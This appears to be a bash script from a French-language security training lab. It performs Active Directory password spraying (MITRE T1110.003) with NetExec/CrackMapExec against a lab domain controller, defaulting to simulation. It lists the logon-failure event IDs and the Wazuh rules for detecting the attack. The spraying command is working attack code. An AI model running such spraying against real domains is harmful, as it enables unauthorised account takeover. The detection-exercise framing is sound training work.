#!/usr/bin/env bash
# =============================================================================
# Scénario 02 — Password spraying Active Directory   (MITRE ATT&CK T1110.003)
# Auteur : André Capito (@acapitow)
#
# Password spraying = UN SEUL mot de passe testé sur BEAUCOUP de comptes
# (l'inverse du brute force), pour rester sous le seuil de verrouillage.
# S'appuie sur un outil standard : NetExec (nxc) / CrackMapExec, ou kerbrute.
# Mode simulation (--check) par défaut.
#
# Usage :
#   ./attack.sh              # simulation
#   ./attack.sh --execute    # exécution réelle CONTRE DC01 (labo isolé) uniquement
#
# Cible : DC01 (10.20.0.10), domaine lab.local.
# Comptes : users.txt (fictifs, créés par le labo). Mot de passe unique pulvérisé.
# =============================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=../lib/lab_guard.sh
source "${SCRIPT_DIR}/../lib/lab_guard.sh"

guard::parse_mode "$@"

TARGET="${TARGET:-$DC01_IP}"
DOMAIN="${DOMAIN:-lab.local}"
USERLIST="${SCRIPT_DIR}/users.txt"
# Mot de passe « courant » unique pulvérisé (correspond au compte de test jdupont).
SPRAY_PASSWORD="${SPRAY_PASSWORD:-Printemps2026!}"

guard::banner "02 · Password spraying AD (T1110.003)"
guard::require_lab_target "$TARGET"

log "Cible            : DC01 ${TARGET} — domaine ${DOMAIN}"
log "Comptes visés    : ${USERLIST} ($(grep -cvE '^\s*#|^\s*$' "$USERLIST" 2>/dev/null || echo '?') comptes fictifs)"
log "Mot de passe     : un seul, pulvérisé sur tous les comptes (${SPRAY_PASSWORD})"
log "Technique MITRE  : T1110.003 (Brute Force: Password Spraying)"
echo

# Outil préféré : NetExec (nxc) ou CrackMapExec (cme). On choisit ce qui est présent.
SPRAY_TOOL=""
for t in nxc netexec crackmapexec cme; do
  if command -v "$t" >/dev/null 2>&1; then SPRAY_TOOL="$t"; break; fi
done

if [[ -z "$SPRAY_TOOL" ]]; then
  guard::need_tool nxc "install : pipx install netexec (ou kerbrute, voir README)"
  SPRAY_TOOL="nxc"   # valeur par défaut pour l'affichage en mode --check
fi

# --continue-on-success : on continue même si un compte tombe (pour tout journaliser).
guard::run "Password spraying SMB via ${SPRAY_TOOL} contre ${TARGET}" \
  "$SPRAY_TOOL" smb "$TARGET" -u "$USERLIST" -p "$SPRAY_PASSWORD" -d "$DOMAIN" --continue-on-success

echo
ok "Terminé (mode ${MODE})."
cat <<EOF

Alternative (profil léger, depuis WS01 en PowerShell natif) — voir README.md.

Journaux attendus sur DC01 (Security) :
  - EventID 4625 (échec d'ouverture de session) pour plusieurs comptes, même IP source
  - SubStatus 0xC000006A (mauvais mot de passe)
  - EventID 4768/4771 (Kerberos) selon le protocole, éventuel 4740 (verrouillage)
Détection : Wazuh 100200→100201 (4625) et 100202→100203 (Kerberos).
Export des alertes : ../../scripts/export_alerts.py --rule 100201,100203
EOF
